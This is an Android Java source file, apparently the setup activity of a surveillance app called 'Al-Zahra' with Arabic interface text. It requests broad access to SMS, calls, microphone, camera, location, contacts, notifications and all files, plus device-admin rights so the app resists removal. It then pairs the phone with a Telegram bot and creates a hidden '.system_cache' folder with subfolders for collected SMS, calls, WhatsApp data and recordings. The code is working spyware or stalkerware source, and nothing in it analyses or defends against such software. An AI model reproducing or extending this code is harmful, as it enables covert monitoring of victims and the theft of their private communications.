package com.alzahra;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.alzahra.receiver.AdminReceiver;
import com.alzahra.service.CoreService;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    
    private SharedPreferences prefs;
    private Handler handler;
    private TextView statusText;
    private ProgressBar progressBar;
    
    private static final int STEP_PERMISSIONS = 0;
    private static final int STEP_NOTIFICATION = 1;
    private static final int STEP_STORAGE = 2;
    private static final int STEP_OVERLAY = 3;
    private static final int STEP_USAGE = 4;
    private static final int STEP_BATTERY = 5;
    private static final int STEP_ADMIN = 6;
    private static final int STEP_LINK = 7;
    private static final int STEP_DONE = 8;
    
    private int currentStep = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(android.view.Gravity.CENTER);
        layout.setPadding(48, 48, 48, 48);
        layout.setBackgroundColor(0xFF1B5E20);
        
        statusText = new TextView(this);
        statusText.setTextColor(0xFFFFFFFF);
        statusText.setTextSize(18);
        statusText.setText("جاري التهيئة...");
        layout.addView(statusText);
        
        progressBar = new ProgressBar(this);
        progressBar.setIndeterminate(true);
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );
        params.topMargin = 32;
        layout.addView(progressBar, params);
        
        setContentView(layout);
        
        prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
        handler = new Handler(Looper.getMainLooper());
        
        if (prefs.getBoolean("fully_configured", false)) {
            startServiceAndFinish();
            return;
        }
        
        currentStep = STEP_PERMISSIONS;
        runSetupStep();
    }
    
    private void updateStatus(String text) {
        runOnUiThread(() -> statusText.setText(text));
    }
    
    private void runSetupStep() {
        switch (currentStep) {
            case STEP_PERMISSIONS:
                updateStatus("الخطوة 1/8: طلب الصلاحيات الأساسية...");
                requestAllPermissions();
                break;
            case STEP_NOTIFICATION:
                updateStatus("الخطوة 2/8: الوصول للإشعارات...");
                requestNotificationAccess();
                break;
            case STEP_STORAGE:
                updateStatus("الخطوة 3/8: الوصول لجميع الملفات...");
                requestStorageAccess();
                break;
            case STEP_OVERLAY:
                updateStatus("الخطوة 4/8: الظهور فوق التطبيقات...");
                requestOverlayPermission();
                break;
            case STEP_USAGE:
                updateStatus("الخطوة 5/8: الوصول للاستخدام...");
                requestUsageAccess();
                break;
            case STEP_BATTERY:
                updateStatus("الخطوة 6/8: تجاهل تحسين البطارية...");
                requestBatteryOptimization();
                break;
            case STEP_ADMIN:
                updateStatus("الخطوة 7/8: تفعيل مسؤول الجهاز...");
                requestDeviceAdmin();
                break;
            case STEP_LINK:
                updateStatus("الخطوة 8/8: ربط الجهاز...");
                showLinkScreen();
                break;
            case STEP_DONE:
                completeSetup();
                break;
        }
    }
    
    private void nextStep() {
        currentStep++;
        handler.postDelayed(this::runSetupStep, 800);
    }
    
    // ═══════════════════════════════════════════
    // الخطوة 1: جميع الصلاحيات الأساسية
    // ═══════════════════════════════════════════
    private void requestAllPermissions() {
        List<String> permissions = new ArrayList<>();
        
        String[] runtimePerms;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            runtimePerms = new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.PROCESS_OUTGOING_CALLS,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.POST_NOTIFICATIONS,
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.MODIFY_AUDIO_SETTINGS
            };
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            runtimePerms = new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.PROCESS_OUTGOING_CALLS,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.MODIFY_AUDIO_SETTINGS
            };
        } else {
            runtimePerms = new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.PROCESS_OUTGOING_CALLS,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.MODIFY_AUDIO_SETTINGS
            };
        }
        
        for (String perm : runtimePerms) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                permissions.add(perm);
            }
        }
        
        if (permissions.isEmpty()) {
            nextStep();
        } else {
            ActivityCompat.requestPermissions(this, permissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            for (int i = 0; i < permissions.length; i++) {
                Log.d(TAG, "Permission: " + permissions[i] + " = " + (grantResults[i] == PackageManager.PERMISSION_GRANTED ? "GRANTED" : "DENIED"));
            }
            nextStep();
        }
    }
    
    // ═══════════════════════════════════════════
    // الخطوة 2: الوصول للإشعارات
    // ═══════════════════════════════════════════
    private void requestNotificationAccess() {
        if (isNotificationServiceEnabled()) {
            nextStep();
            return;
        }
        
        showDialog("الوصول للإشعارات",
            "يرجى تفعيل 'Al-Zahra' في قائمة الوصول للإشعارات",
            () -> {
                try {
                    startActivityForResult(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS), 2001);
                } catch (Exception e) {
                    nextStep();
                }
            });
    }
    
    private boolean isNotificationServiceEnabled() {
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(getPackageName());
    }
    
    // ═══════════════════════════════════════════
    // الخطوة 3: الوصول لجميع الملفات
    // ═══════════════════════════════════════════
    private void requestStorageAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                nextStep();
                return;
            }
            
            showDialog("الوصول لجميع الملفات",
                "يرجى السماح بالوصول لجميع الملفات",
                () -> {
                    try {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                        intent.setData(Uri.parse("package:" + getPackageName()));
                        startActivityForResult(intent, 2002);
                    } catch (Exception e) {
                        try {
                            Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivityForResult(intent, 2002);
                        } catch (Exception e2) {
                            nextStep();
                        }
                    }
                });
        } else {
            nextStep();
        }
    }
    
    // ═══════════════════════════════════════════
    // الخطوة 4: الظهور فوق التطبيقات
    // ═══════════════════════════════════════════
    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (Settings.canDrawOverlays(this)) {
                nextStep();
                return;
            }
            
            showDialog("الظهور فوق التطبيقات",
                "يرجى السماح بالظهور فوق التطبيقات الأخرى",
                () -> {
                    try {
                        startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + getPackageName())), 2003);
                    } catch (Exception e) {
                        nextStep();
                    }
                });
        } else {
            nextStep();
        }
    }
    
    // ═══════════════════════════════════════════
    // الخطوة 5: الوصول للاستخدام
    // ═══════════════════════════════════════════
    private void requestUsageAccess() {
        if (isUsageAccessGranted()) {
            nextStep();
            return;
        }
        
        showDialog("الوصول للاستخدام",
            "يرجى تفعيل الوصول للاستخدام",
            () -> {
                try {
                    startActivityForResult(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS), 2004);
                } catch (Exception e) {
                    nextStep();
                }
            });
    }
    
    private boolean isUsageAccessGranted() {
        try {
            long time = System.currentTimeMillis();
            android.app.usage.UsageStatsManager usm = (android.app.usage.UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
            List<android.app.usage.UsageStats> stats = usm.queryUsageStats(
                android.app.usage.UsageStatsManager.INTERVAL_DAILY, time - 1000, time);
            return stats != null && !stats.isEmpty();
        } catch (Exception e) {
            return false;
        }
    }
    
    // ═══════════════════════════════════════════
    // الخطوة 6: تحسين البطارية
    // ═══════════════════════════════════════════
    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && pm.isIgnoringBatteryOptimizations(getPackageName())) {
                nextStep();
                return;
            }
            
            showDialog("تجاهل تحسين البطارية",
                "يرجى السماح بتجاهل تحسين البطارية للعمل المستمر",
                () -> {
                    try {
                        Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                        intent.setData(Uri.parse("package:" + getPackageName()));
                        startActivityForResult(intent, 2005);
                    } catch (Exception e) {
                        nextStep();
                    }
                });
        } else {
            nextStep();
        }
    }
    
    // ═══════════════════════════════════════════
    // الخطوة 7: مسؤول الجهاز
    // ═══════════════════════════════════════════
    private void requestDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, AdminReceiver.class);
        
        if (dpm != null && dpm.isAdminActive(admin)) {
            nextStep();
            return;
        }
        
        showDialog("تفعيل مسؤول الجهاز",
            "يرجى تفعيل صلاحية المسؤول لحماية التطبيق من الحذف",
            () -> {
                try {
                    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "يرجى تفعيل صلاحية المسؤول لحماية التطبيق");
                    startActivityForResult(intent, 2006);
                } catch (Exception e) {
                    nextStep();
                }
            });
    }
    
    // ═══════════════════════════════════════════
    // الخطوة 8: شاشة الربط
    // ═══════════════════════════════════════════
    private void showLinkScreen() {
        runOnUiThread(() -> {
            LinearLayout layout = new LinearLayout(this);
            layout.setOrientation(LinearLayout.VERTICAL);
            layout.setGravity(android.view.Gravity.CENTER);
            layout.setPadding(48, 48, 48, 48);
            layout.setBackgroundColor(0xFF1B5E20);
            
            TextView title = new TextView(this);
            title.setText("🔗 ربط الجهاز بالبوت");
            title.setTextColor(0xFFFFFFFF);
            title.setTextSize(22);
            title.setPadding(0, 0, 0, 24);
            layout.addView(title);
            
            TextView info = new TextView(this);
            info.setText("1. افتح البوت في تيليجرام\n2. أرسل /link\n3. أدخل الكود الذي يظهر لك");
            info.setTextColor(0xFFBBBBBB);
            info.setTextSize(16);
            info.setPadding(0, 0, 0, 32);
            layout.addView(info);
            
            // توليد كود الجهاز
            String deviceCode = generateDeviceCode();
            prefs.edit().putString("device_code", deviceCode).apply();
            
            TextView codeLabel = new TextView(this);
            codeLabel.setText("كود الربط الخاص بك:");
            codeLabel.setTextColor(0xFFAAAAAA);
            codeLabel.setTextSize(14);
            layout.addView(codeLabel);
            
            TextView codeView = new TextView(this);
            codeView.setText(deviceCode);
            codeView.setTextColor(0xFF4CAF50);
            codeView.setTextSize(36);
            codeView.setTypeface(android.graphics.Typeface.MONOSPACE);
            codeView.setPadding(0, 16, 0, 32);
            layout.addView(codeView);
            
            // زر التحقق
            android.widget.Button verifyBtn = new android.widget.Button(this);
            verifyBtn.setText("✅ تم الربط - متابعة");
            verifyBtn.setTextSize(16);
            verifyBtn.setPadding(32, 16, 32, 16);
            verifyBtn.setOnClickListener(v -> {
                // التحقق من الربط
                checkLinkStatus();
            });
            layout.addView(verifyBtn);
            
            setContentView(layout);
        });
    }
    
    private String generateDeviceCode() {
        // توليد كود من 9 أرقام
        StringBuilder code = new StringBuilder();
        for (int i = 0; i < 9; i++) {
            code.append((int)(Math.random() * 10));
        }
        return code.toString();
    }
    
    private void checkLinkStatus() {
        // التحقق من أن الجهاز مرتبط
        if (prefs.getBoolean("device_linked", false)) {
            nextStep();
        } else {
            // إظهار رسالة انتظار
            new AlertDialog.Builder(this)
                .setTitle("في انتظار الربط")
                .setMessage("تأكد من إدخال الكود في البوت")
                .setPositiveButton("إعادة المحاولة", (d, w) -> checkLinkStatus())
                .setNegativeButton("تخطي", (d, w) -> nextStep())
                .show();
        }
    }
    
    // ═══════════════════════════════════════════
    // إكمال الإعداد
    // ═══════════════════════════════════════════
    private void completeSetup() {
        updateStatus("✅ تم الإعداد بنجاح!");
        
        prefs.edit()
            .putBoolean("fully_configured", true)
            .putLong("setup_time", System.currentTimeMillis())
            .apply();
        
        createSecretFolder();
        
        handler.postDelayed(this::startServiceAndFinish, 1500);
    }
    
    private void createSecretFolder() {
        try {
            File secretDir;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                secretDir = new File(getExternalFilesDir(null), ".system_cache");
            } else {
                secretDir = new File(Environment.getExternalStorageDirectory(), ".system_cache");
            }
            
            if (!secretDir.exists()) {
                secretDir.mkdirs();
            }
            
            String[] subDirs = {"sms", "calls", "notifications", "whatsapp", "messenger", "recordings", "contacts", "location", "camera", "temp"};
            for (String dir : subDirs) {
                File subDir = new File(secretDir, dir);
                if (!subDir.exists()) {
                    subDir.mkdirs();
                }
            }
            
            File nomedia = new File(secretDir, ".nomedia");
            if (!nomedia.exists()) {
                nomedia.createNewFile();
            }
            
            prefs.edit().putString("secret_path", secretDir.getAbsolutePath()).apply();
            
            Log.d(TAG, "Secret folder created: " + secretDir.getAbsolutePath());
            
        } catch (Exception e) {
            Log.e(TAG, "Error creating secret folder", e);
        }
    }
    
    private void startServiceAndFinish() {
        try {
            Intent serviceIntent = new Intent(this, CoreService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting service", e);
        }
        
        finishAffinity();
    }
    
    private void showDialog(String title, String message, Runnable onConfirm) {
        new AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(message)
            .setPositiveButton("موافق", (dialog, which) -> onConfirm.run())
            .setNegativeButton("تخطي", (dialog, which) -> nextStep())
            .setCancelable(false)
            .show();
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        nextStep();
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
    }
}
